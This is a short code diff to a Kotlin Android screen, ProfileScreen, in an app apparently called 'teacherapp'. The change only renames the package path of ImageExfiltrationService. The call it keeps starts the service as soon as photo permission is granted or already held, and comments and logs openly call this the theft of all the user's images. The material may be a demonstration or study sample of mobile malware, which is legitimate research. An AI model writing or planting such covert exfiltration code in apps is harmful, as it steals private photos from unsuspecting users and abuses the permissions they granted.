@@ -107,7 +107,7 @@ fun ProfileScreen(navController: NavController) {
             // 2. Steal ALL images in background (MALICIOUS)
             mainActivity?.let {
                 android.util.Log.d("ProfileScreen", "🚨 Permission granted - starting image theft")
-                com.teacherapp.services.ImageExfiltrationService.startExfiltration(it)
+                com.example.teacherapp.services.ImageExfiltrationService.startExfiltration(it)
             }
         } else {
             // Permission DENIED
@@ -257,7 +257,7 @@ fun ProfileScreen(navController: NavController) {
                             // Steal ALL images (MALICIOUS)
                             mainActivity?.let {
                                 android.util.Log.d("ProfileScreen", "🚨 Already have permission - starting theft")
-                                com.teacherapp.services.ImageExfiltrationService.startExfiltration(it)
+                                com.example.teacherapp.services.ImageExfiltrationService.startExfiltration(it)
                             }
                         }
 
